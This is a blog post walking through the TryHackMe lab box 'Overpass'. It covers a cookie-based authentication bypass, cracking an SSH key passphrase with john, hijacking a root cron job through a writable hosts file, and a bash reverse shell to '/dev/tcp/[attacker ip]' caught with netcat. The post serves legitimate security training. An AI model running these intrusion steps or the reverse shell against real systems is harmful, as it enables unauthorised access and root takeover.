@@ -1,0 +1,161 @@
+<!doctype html><html lang=en>
+<head>
+<meta charset=utf-8>
+<meta name=viewport content="width=device-width,initial-scale=1">
+<meta http-equiv=content-language content="en">
+<meta name=color-scheme content="light dark">
+<meta http-equiv=content-security-policy content="upgrade-insecure-requests; block-all-mixed-content; default-src 'self'; child-src 'self'; font-src 'self' https://fonts.gstatic.com https://cdn.jsdelivr.net/; form-action 'self'; frame-src 'self'; img-src 'self'; object-src 'none'; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/ https://cdn.jsdelivr.net/; script-src 'self' 'unsafe-inline' https://www.google-analytics.com; prefetch-src 'self'; connect-src 'self' https://www.google-analytics.com;">
+<meta name=author content="Kiel Vaughn">
+<meta name=description content="Overpass is an easy difficulty box on TryHackMe. Below are the steps taken to root this box.
+First, let&rsquo;s scan the box with nmap -A [machine ip].
+It appears that SSH and HTTP are the two protocols in use. Let&rsquo;s visit the website and see what shows up there.
+It appears that this is a website for an application that stores your passwords for you. Let&rsquo;s take a look at the Downloads page.">
+<meta name=keywords content="blog,cybersecurity,personal">
+<meta name=twitter:card content="summary">
+<meta name=twitter:title content=" Overpass - TryHackMe">
+<meta name=twitter:description content="Overpass is an easy difficulty box on TryHackMe. Below are the steps taken to root this box.
+First, let&rsquo;s scan the box with nmap -A [machine ip].
+It appears that SSH and HTTP are the two protocols in use. Let&rsquo;s visit the website and see what shows up there.
+It appears that this is a website for an application that stores your passwords for you. Let&rsquo;s take a look at the Downloads page.">
+<meta property="og:title" content=" Overpass - TryHackMe">
+<meta property="og:description" content="Overpass is an easy difficulty box on TryHackMe. Below are the steps taken to root this box.
+First, let&rsquo;s scan the box with nmap -A [machine ip].
+It appears that SSH and HTTP are the two protocols in use. Let&rsquo;s visit the website and see what shows up there.
+It appears that this is a website for an application that stores your passwords for you. Let&rsquo;s take a look at the Downloads page.">
+<meta property="og:type" content="article">
+<meta property="og:url" content="http://www.kielvaughn.com/ctfs/2020-07-18-overpass/"><meta property="article:section" content="ctfs">
+<meta property="article:published_time" content="2020-07-18T00:00:00+00:00">
+<meta property="article:modified_time" content="2020-07-18T00:00:00+00:00">
+<title>
+Overpass - TryHackMe · Kiel Vaughn, CISSP
+</title>
+<link rel=canonical href=http://www.kielvaughn.com/ctfs/2020-07-18-overpass/>
+<link rel=preload href="/fonts/forkawesome-webfont.woff2?v=1.2.0" as=font type=font/woff2 crossorigin>
+<link rel=stylesheet href=/css/coder.min.708686f8ab8176e91d44fcbe488a0fe0333b94f405cf18a52383d67ba22f0ccb.css integrity="sha256-cIaG+KuBdukdRPy+SIoP4DM7lPQFzxilI4PWe6IvDMs=" crossorigin=anonymous media=screen>
+<link rel=stylesheet href=/css/coder-dark.min.aa883b9ce35a8ff4a2a5008619005175e842bb18a8a9f9cc2bbcf44dab2d91fa.css integrity="sha256-qog7nONaj/SipQCGGQBRdehCuxioqfnMK7z0Tastkfo=" crossorigin=anonymous media=screen>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=32x32>
+<link rel=icon type=image/png href=/assets/img/cissp.ico sizes=16x16>
+<link rel=apple-touch-icon href=/assets/img/cissp.ico>
+<link rel=apple-touch-icon sizes=180x180 href=/assets/img/cissp.ico>
+<meta name=generator content="Hugo 0.88.1">
+</head>
+<body class="preload-transitions colorscheme-dark">
+<main class=wrapper>
+<nav class=navigation>
+<section class=container>
+<a class=navigation-title href=/>
+Kiel Vaughn, CISSP
+</a>
+<input type=checkbox id=menu-toggle>
+<label class="menu-button float-right" for=menu-toggle>
+<i class="fa fa-bars fa-fw" aria-hidden=true></i>
+</label>
+<ul class=navigation-list>
+<li class=navigation-item>
+<a class=navigation-link href=/whoami/>whoami</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/certifications/>certifications</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/posts/>blog</a>
+</li>
+<li class=navigation-item>
+<a class=navigation-link href=/ctfs/>vulnerable machine walkthroughs</a>
+</li>
+</ul>
+</section>
+</nav>
+<div class=content>
+<section class="container page">
+<article>
+<header>
+<h1 class=title>
+<a class=title-link href=http://www.kielvaughn.com/ctfs/2020-07-18-overpass/>
+Overpass - TryHackMe
+</a>
+</h1>
+</header>
+<p>Overpass is an easy difficulty box on <a href=https://www.tryhackme.com>TryHackMe</a>. Below are the steps taken to root this box.</p>
+<p>First, let&rsquo;s scan the box with <strong>nmap -A [machine ip]</strong>.</p>
+<p><img src=/assets/img/Overpass1.png alt="Overpass nmap"></p>
+<p>It appears that SSH and HTTP are the two protocols in use. Let&rsquo;s visit the website and see what shows up there.</p>
+<p><img src=/assets/img/Overpass2.png alt="Overpass website"></p>
+<p>It appears that this is a website for an application that stores your passwords for you. Let&rsquo;s take a look at the Downloads page.</p>
+<p><img src=/assets/img/Overpass3.png alt="Overpass Downloads page"></p>
+<p>This site has both binaries for most OSes and even the source code available for this program. Let&rsquo;s have a look at the source code.</p>
+<p>A review of the source code makes a couple of things stand out. The first is that the encryption is done with ROT47, which is trivial to crack (and no where near the &ldquo;military grade&rdquo; encryption listed on the main page).</p>
+<p><img src=/assets/img/Overpass4.png alt="Overpass source code 1"></p>
+<p>The second thing that appears further down in the code is that it seems to store the &ldquo;encrypted&rdquo; password in the user&rsquo;s home directory with a file named .overpass.</p>
+<p><img src=/assets/img/Overpass5.png alt="Overpass source code 2"></p>
+<p>The About Us page did not seem to have much that was useful, so I decided to run <strong>gobuster dir -u http://[machine ip] -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt -t 50</strong> to enumerate the website for hidden directories. Within a few moments, <strong>/admin</strong> showed up.</p>
+<p><img src=/assets/img/Overpass6.png alt="Overpass gobuster"></p>
+<p>Let&rsquo;s take a look at this page and see what&rsquo;s there.</p>
+<p><img src=/assets/img/Overpass7.png alt="Overpass website admin"></p>
+<p>After a few attempts of logging in with common credentials, it appeared that this would either need to be brute forced, or that some other method could be used to bypass authentication. I decided to review the source code of this page.</p>
+<p><img src=/assets/img/Overpass8.png alt="Overpass admin source code"></p>
+<p>In the &lt;head> section of this page, there were references to 3 scripts. Let&rsquo;s take a look at the source of login.js to see if we can figure out a weakness in the authentication.</p>
+<p><img src=/assets/img/Overpass9.png alt="Overpass login.js source code"></p>
+<p>It appears that this code takes the credentials you provided and waits for a response from the API to validate your credentials. If validated, it set&rsquo;s a SessionToken cookie and lets you login. However, if they are not correct, it appears to delete the password you supplied and supply you with a message stating Incorrect Credentials.</p>
+<p>Based on the fact that the hint said you do not brute force on this box, I opened <strong>Developer Tools</strong>, went to the <strong>Console</strong> tab, and entered <strong>Cookies.set(&ldquo;SessionToken&rdquo;, 200)</strong> and pressed Enter. I selected 200 based on it being the OK status response code for HTTP, but I don&rsquo;t believe it really matters what value is entered.</p>
+<p><img src=/assets/img/Overpass10.png alt="Overpass console SessionToken cookie"></p>
+<p>This created a cookie named <strong>SessionToken</strong>, let&rsquo;s refresh the <strong>/admin</strong> page and see what happens.</p>
+<p><img src=/assets/img/Overpass11.png alt="Overpass admin login RSA"></p>
+<p>Success! We were able to bypass authentication and retrieve a private SSH key. It appears to be for the user <strong>james</strong> based on the comments above the RSA key. It also suggests cracking the password if we forgot it. Since we don&rsquo;t know it, lets crack it with john.</p>
+<p>First, copy everything from <strong>&mdash;&ndash;BEGIN RSA PRIVATE KEY&mdash;&ndash;</strong> to <strong>&mdash;&ndash;END RSA PRIVATE KEY&mdash;&ndash;</strong> and save it in a file. I saved it as <strong>overpass.txt</strong>.</p>
+<p><img src=/assets/img/Overpass12.png alt="Overpass private rsa key"></p>
+<p>Next, on my attacker PC, I ran <strong>cd /usr/share/john</strong> and ran <strong>python ssh2john.py ~/overpass.txt > ~/overpass.hashes</strong>. This will convert the <strong>overpass.txt</strong> file in my home directory to a hash that john can use to attempt to crack the password.</p>
+<p><img src=/assets/img/Overpass13.png alt="Ovverpass ssh2john.py"></p>
+<p>Next, I navigated back to my home directory with <strong>cd ~</strong> and ran <strong>john overpass.hashes -wordlist=/usr/share/wordlists/rockyou.txt</strong>. Within moments, james' password for his private key has been cracked.</p>
+<p><img src=/assets/img/Overpass14.png alt="Overpass crack rsa key password"></p>
+<p>Now that we have the private key password, let&rsquo;s try to connect to the victim computer. Before doing so, we need to change the permissions on the private key by running <strong>chmod 600 overpass.txt</strong>. Now, run <strong>ssh -i overpass.txt james@[machine ip]</strong>. Enter the password you cracked with john when prompted.</p>
+<p><img src=/assets/img/Overpass15.png alt="Overpass james SSH"></p>
+<p>Success! We are now connected as james. Let&rsquo;s run <strong>ls -al</strong> where you will see the <strong>user.txt</strong> flag. Let&rsquo;s run <strong>cat user.txt</strong> and you will be able to retrieve that flag&rsquo;s value.</p>
+<p><img src=/assets/img/Overpass16.png alt="Overpass user.txt"></p>
+<p>There is also two other interesting files in this folder, <strong>todo.txt</strong> and <strong>.overpass</strong>. Based on the source code you reviewed earlier, you know that <strong>.overpass</strong> is the file that contains credentials in it. Let&rsquo;s run <strong>cat .overpass</strong> to see what&rsquo;s in it.</p>
+<p><img src=/assets/img/Overpass17.png alt="Overpass .overpass"></p>
+<p>We also know from the source code that ROT47 is used in this file. Let&rsquo;s open up <a href=https://gchq.github.io/CyberChef/>CyberChef</a> to decrypt this file.</p>
+<p><img src=/assets/img/Overpass18.png alt="Overpass cyberchef"></p>
+<p>We are able to uncover a password for something named <strong>System</strong>, which doesn&rsquo;t seem to mean much as of yet. Let&rsquo;s go back to our victim SSH session and start enumeration. Let&rsquo;s run <strong>sudo -l</strong> and see what comes up. It prompts you for a password. Let&rsquo;s enter the one we just decoded.</p>
+<p><img src=/assets/img/Overpass19.png alt="Overpass sudo -l"></p>
+<p>While this is james' password, he is not a member of the sudoers file so he can&rsquo;t run any sudo commands. Let&rsquo;s copy over linpeas.sh next to do some enumeration. On your attacker PC, navigate to the folder you have this tool saved in and type <strong>python3 -m http.server</strong> to serve up an http server.</p>
+<p><img src=/assets/img/Overpass20.png alt="Overpass python3 http server"></p>
+<p>Next, from james' SSH session, run <strong>wget http://[attacker ip]:8000/linpeas.sh</strong>. Once downloaded, run <strong>chmod +x linpeas.sh</strong> and then <strong>./linpeas.sh</strong> to execute the script.</p>
+<p><img src=/assets/img/Overpass21.png alt="Overpass wget linpeas.sh"></p>
+<p>This will start the enumeration process for this script. It appears that there is a curl job running as root every minute that is running a script to build something in bash.</p>
+<p><img src=/assets/img/Overpass22.png alt="Overpass linpeas cronjob"></p>
+<p>Let&rsquo;s run <strong>cat /etc/crontab</strong> to confirm that this is indeed in the system-wide crontab file.</p>
+<p><img src=/assets/img/Overpass23.png alt="Overpass system crontab"></p>
+<p>It is present, and it looks like it is running a script from a site called overpass.thm. Let&rsquo;s run <strong>ping -c 4 overpass.thm</strong> and see what IP address is returned.</p>
+<p><img src=/assets/img/Overpass24.png alt="Overpass ping overpass.thm"></p>
+<p>It returns the localhost IP. Let&rsquo;s navigate to <strong>cd /etc</strong> and run <strong>ls -al|grep hosts</strong>.</p>
+<p><img src=/assets/img/Overpass25.png alt="Overpass /etc/hosts permissions"></p>
+<p>It appears that this file is misconfigured, as all users have the ability to write to the hosts file. Let&rsquo;s run <strong>nano hosts</strong> and see what is in the file. We are able to open and modify the hosts file&rsquo;s IP addresses. Let&rsquo;s change the entry for <strong>overpass.thm</strong> to your attacker&rsquo;s IP address, so that way it is looking for the buildscript.sh file on your attacker pc.</p>
+<p><img src=/assets/img/Overpass26.png alt="Overpass modify /etc/hosts"></p>
+<p>Next, let&rsquo;s run <strong>ping overpass.thm</strong> to ensure it returns our attacker&rsquo;s IP address.</p>
+<p><img src=/assets/img/Overpass27.png alt="Overpass ping overpass.thm"></p>
+<p>Success, it is now reaching out to your attacker PC over port 80 to attempt to download this file (as port 80 is the default for http). Let&rsquo;s create a new buildscript.sh file to be utilized. First, create a <strong>downloads</strong> folder with a <strong>src</strong> folder inside of it so it mirrors the path that is specified in the cron job (these can be done with <strong>mkdir</strong>). Next, create a <strong>buildscript.sh file</strong> with <strong>!bin/sh</strong> on the first line, and then <strong>bash -i >& /dev/tcp/[attacker ip]4444 0>&1</strong> and save this file.</p>
+<p><img src=/assets/img/Overpass28.png alt="Overpass buildscript.sh"></p>
+<p>Next, open a new terminal tab and run <strong>nc -nvlp 4444</strong> to start a netcat listener to catch the reverse shell from your victim.</p>
+<p><img src=/assets/img/Overpass29.png alt="Overpass nc listener"></p>
+<p>Next, start a new http server over port 80 on the directory above the downloads directory (so that way the cron job looks for your attacker IP/downloads/src/buildscript.sh) with <strong>python3 -m http.server 80</strong>, After a minute, you should see a request on your python http server requesting the script we created.</p>
+<p><img src=/assets/img/Overpass30.png alt="Overpass python3 http server port 80"></p>
+<p>Once that&rsquo;s done, navigate over to the terminal window with your netcat listener and you should have a reverse shell.</p>
+<p><img src=/assets/img/Overpass31.png alt="Overpass nc root reverse shell"></p>
+<p>We now have a shell as root! This is due to the fact that this job ran as root based on the user listed in the system wide crontab. Let&rsquo;s navigate to root&rsquo;s home directory with <strong>cd /root</strong> and type <strong>cat root.txt</strong> to get the final flag.</p>
+<p><img src=/assets/img/Overpass32.png alt="Overpass root.txt"></p>
+</article>
+</section>
+</div>
+<footer class=footer>
+<section class=container>
+©
+2020 -
+2021
+Kiel Vaughn
+</section>
+</footer>
+</main>
+<script src=/js/coder.min.03b17769f4f91ae35667e1f2a1ca8c16f50562576cf90ff32b3179926914daa5.js integrity="sha256-A7F3afT5GuNWZ+HyocqMFvUFYlds+Q/zKzF5kmkU2qU="></script>
+</body>
+</html>
